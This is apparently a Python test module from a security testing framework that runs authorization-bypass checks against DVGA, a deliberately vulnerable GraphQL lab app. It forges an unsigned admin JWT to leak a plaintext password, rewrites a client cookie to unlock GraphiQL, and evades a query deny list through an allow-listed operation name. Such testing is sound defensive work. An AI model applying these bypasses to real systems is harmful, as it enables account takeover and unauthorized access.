"""
GraphQL Authorization Bypass tests (DVGA).
"""

from __future__ import annotations

import logging
from typing import Any, Optional

import requests

from src.utils.dvga_client import DVGAClient
from src.vulnerabilities.base import Severity, VulnerabilityResult, VulnerabilityTest

logger = logging.getLogger(__name__)


def _parse_json(resp: requests.Response) -> Optional[dict[str, Any]]:
    try:
        return resp.json()
    except ValueError:
        return None


class JWTTokenForgeTest(VulnerabilityTest):
    """
    Confirms whether DVGA's `me` query validates a JWT's signature before
    trusting its `identity` claim.
    """

    name = "jwt_token_forge"
    owasp_category = "API2:2023 Broken Authentication"

    def __init__(self, architecture: str, target: str, client: DVGAClient) -> None:
        super().__init__(architecture, target)
        self.client = client

    def run(self) -> list[VulnerabilityResult]:
        token = self.client.login("operator")

        return [
            self._test_legitimate_token(token),
            self._test_forged_admin_token(),
        ]

    def _test_legitimate_token(self, token: str) -> VulnerabilityResult:
        """Baseline: a genuine token for 'operator' must only return their own record."""
        resp = self.client.me(token)
        data = _parse_json(resp) or {}
        me = data.get("data", {}).get("me") or {}

        matches_own_identity = me.get("username") == "operator"
        outcome = (
            "returned the caller's own record, as expected"
            if matches_own_identity
            else "did not match the requesting identity — baseline unreliable"
        )
        return self._result(
            passed=matches_own_identity,
            severity=Severity.LOW,
            evidence=(
                f"me(token=<operator's own token>) -> HTTP {resp.status_code}, "
                f"username={me.get('username')!r} ({outcome})."
            ),
            request_summary="query Me(token) as operator's own token",
            response_summary=f"HTTP {resp.status_code}; username={me.get('username')!r}",
        )

    def _test_forged_admin_token(self) -> VulnerabilityResult:
        """Bypass: a JWT with a forged identity claim and no valid signature."""
        forged_identity = self.client.scan_config.get("jwt_forge", {}).get(
            "forged_identity", "admin"
        )
        forged_token = self.client.forge_token(forged_identity)
        resp = self.client.me(forged_token)
        data = _parse_json(resp) or {}
        me = data.get("data", {}).get("me") or {}

        leaked_username = me.get("username")
        leaked_password = me.get("password")
        confirmed = leaked_username == forged_identity and bool(leaked_password)

        evidence = f"me(token=<forged, identity={forged_identity!r}>) -> HTTP {resp.status_code}."
        if confirmed:
            evidence += (
                f" Returned {leaked_username!r}'s record including a plaintext password "
                f"({leaked_password!r}), despite the token's signature never being verified "
                "and the caller never authenticating as that user — confirms JWT identity "
                "forgery."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.CRITICAL if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"query Me(token) with forged identity={forged_identity!r}",
            response_summary=f"HTTP {resp.status_code}; username={leaked_username!r}",
            forged_identity=forged_identity,
        )


class GraphiQLInterfaceProtectionBypassTest(VulnerabilityTest):
    """
    Confirms whether DVGA's GraphiQL IDE route is reachable by rewriting a
    client-side cookie, rather than being enforced server-side.
    """

    name = "graphiql_interface_protection_bypass"
    owasp_category = "API8:2023 Security Misconfiguration"

    def __init__(self, architecture: str, target: str, client: DVGAClient) -> None:
        super().__init__(architecture, target)
        self.client = client

    #: side-effect-free probe query — resolving any field through /graphiql
    #: is enough to trigger the cookie check, since it runs at field
    #: resolution time, not on page load.
    PROBE_QUERY = "{ __typename }"

    def run(self) -> list[VulnerabilityResult]:

        self.client.set_difficulty("easy")
        self.client.prime_graphiql_cookie()
        return [
            self._test_default_cookie_blocks(),
            self._test_cookie_bypass(),
        ]

    def _test_default_cookie_blocks(self) -> VulnerabilityResult:
        """Baseline: the cookie DVGA itself set on first load must block query execution."""
        cfg = self.client.scan_config.get("interface_protection", {})
        current_cookie = self.client.graphiql_cookie()
        resp = self.client.graphiql_query(self.PROBE_QUERY)
        data = _parse_json(resp) or {}
        errors = data.get("errors")

        blocked = bool(errors) and data.get("data") is None
        return self._result(
            passed=blocked,
            severity=Severity.LOW,
            evidence=(
                f"query {self.PROBE_QUERY!r} via {cfg.get('graphiql_path', '/graphiql')} "
                f"with cookie {cfg.get('cookie_name', 'env')}={current_cookie!r} -> "
                f"HTTP {resp.status_code}, errors={errors!r} "
                f"({'execution rejected, as expected' if blocked else 'unexpectedly executed — baseline unreliable'})."
            ),
            request_summary=f"POST {cfg.get('graphiql_path', '/graphiql')} query (server-set cookie)",
            response_summary=f"HTTP {resp.status_code}; blocked={blocked}",
        )

    def _test_cookie_bypass(self) -> VulnerabilityResult:
        """Bypass: overwrite the cookie client-side to a value the server never issued."""
        cfg = self.client.scan_config.get("interface_protection", {})
        enabled_value = cfg.get("enabled_value", "graphiql:enable")
        self.client.set_graphiql_cookie(enabled_value)
        resp = self.client.graphiql_query(self.PROBE_QUERY)
        data = _parse_json(resp) or {}
        typename = data.get("data", {}).get("__typename") if data.get("data") else None

        confirmed = resp.status_code == 200 and not data.get("errors") and bool(typename)

        evidence = (
            f"query {self.PROBE_QUERY!r} via {cfg.get('graphiql_path', '/graphiql')} "
            f"with client-rewritten cookie {cfg.get('cookie_name', 'env')}={enabled_value!r} "
            f"-> HTTP {resp.status_code}, data={data.get('data')!r}."
        )
        if confirmed:
            evidence += (
                " Query executed successfully through the GraphiQL route — the protection "
                "is a client-trusted cookie value with no server-side session check behind "
                "it, so any client can set it directly instead of relying on the app to "
                "issue it."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.MEDIUM if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"POST {cfg.get('graphiql_path', '/graphiql')} query (client-set cookie)",
            response_summary=f"HTTP {resp.status_code}; data={data.get('data')!r}",
        )


class QueryDenyListBypassTest(VulnerabilityTest):
    """
    Confirms whether DVGA's query deny list can be defeated by wrapping a
    restricted field in an allow-listed operation name.
    """

    name = "query_deny_list_bypass"
    owasp_category = "API5:2023 Broken Function Level Authorization"

    def __init__(self, architecture: str, target: str, client: DVGAClient) -> None:
        super().__init__(architecture, target)
        self.client = client

    def run(self) -> list[VulnerabilityResult]:
        self.client.set_difficulty("hard")

        return [
            self._test_denied_query_blocked(),
            self._test_bypass_query_succeeds(),
        ]

    def _test_denied_query_blocked(self) -> VulnerabilityResult:
        """Baseline: the restricted query, sent as-is, must be rejected."""
        cfg = self.client.scan_config.get("deny_list_bypass", {})
        denied_query = cfg.get("denied_query", "{ systemHealth }")
        resp = self.client.query(denied_query)

        blocked = resp.status_code != 200 or "deny list" in resp.text.lower()
        return self._result(
            passed=blocked,
            severity=Severity.LOW,
            evidence=(
                f"query {denied_query!r} (no operationName) -> HTTP {resp.status_code} "
                f"({'rejected by the deny list, as expected' if blocked else 'unexpectedly succeeded — baseline unreliable'})."
            ),
            request_summary=f"POST /graphql query={denied_query!r}",
            response_summary=f"HTTP {resp.status_code}",
        )

    def _test_bypass_query_succeeds(self) -> VulnerabilityResult:
        """Bypass: the same restricted field, wrapped in an allow-listed operation name."""
        cfg = self.client.scan_config.get("deny_list_bypass", {})
        bypass_query = cfg.get(
            "bypass_query", "query getPastes {\n  systemHealth\n}"
        )
        operation_name = cfg.get("bypass_operation_name", "getPastes")
        resp = self.client.query(bypass_query, operation_name=operation_name)
        data = _parse_json(resp) or {}
        system_health = data.get("data", {}).get("systemHealth")

        confirmed = resp.status_code == 200 and not data.get("errors") and bool(system_health)

        evidence = (
            f"query {bypass_query!r} with operationName={operation_name!r} -> "
            f"HTTP {resp.status_code}."
        )
        if confirmed:
            evidence += (
                f" Returned {system_health!r} — the deny list only exact-matches the raw "
                "query text against a fixed set of strings, so wrapping the same restricted "
                "field in an allow-listed operation name evades both the deny list and the "
                "operation-name allow list at once, reaching a diagnostic query meant to be "
                "blocked in hard difficulty."
            )

        return self._result(
            passed=not confirmed,
            severity=Severity.HIGH if confirmed else Severity.LOW,
            evidence=evidence,
            request_summary=f"POST /graphql query={bypass_query!r} operationName={operation_name!r}",
            response_summary=f"HTTP {resp.status_code}; systemHealth={system_health!r}",
        )


def _print_results(results: list[VulnerabilityResult]) -> None:
    for result in results:
        status = "PASS" if result.passed else f"FAIL ({result.severity.value.upper()})"
        print(f"[{status}] {result.test_name} - {result.owasp_category}")
        print(f"  Evidence:  {result.evidence}")
        print(f"  Request:   {result.request_summary}")
        print(f"  Response:  {result.response_summary}")
        print()


def _wait_for_dvga(client: DVGAClient, timeout: float = 30.0, interval: float = 2.0) -> None:
    """
    Poll the container until it accepts connections.
    """
    import time

    deadline = time.monotonic() + timeout
    last_error: Optional[Exception] = None
    while time.monotonic() < deadline:
        try:
            client.get("/")
            return
        except requests.exceptions.RequestException as exc:
            last_error = exc
            time.sleep(interval)
    raise RuntimeError(f"DVGA did not become reachable within {timeout}s: {last_error}")


def _run_dvga() -> None:
    dvga_client = DVGAClient.from_config("config/dvga.yaml")
    _wait_for_dvga(dvga_client)
    _print_results(
        JWTTokenForgeTest(architecture="graphql", target="dvga", client=dvga_client).run()
    )
    _print_results(
        GraphiQLInterfaceProtectionBypassTest(
            architecture="graphql", target="dvga", client=dvga_client
        ).run()
    )
    _print_results(
        QueryDenyListBypassTest(
            architecture="graphql", target="dvga", client=dvga_client
        ).run()
    )
    dvga_client.set_difficulty("easy")


if __name__ == "__main__":
    import argparse

    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--target",
        choices=["dvga", "all"],
        default="all",
        help=(
            "Which target's container must be up. DVGA is currently this "
            "framework's only GraphQL target, so 'all' and 'dvga' behave "
            "identically — requires docker-compose.dvga.yml to be running."
        ),
    )
    args = parser.parse_args()

    if args.target in ("dvga", "all"):
        _run_dvga()
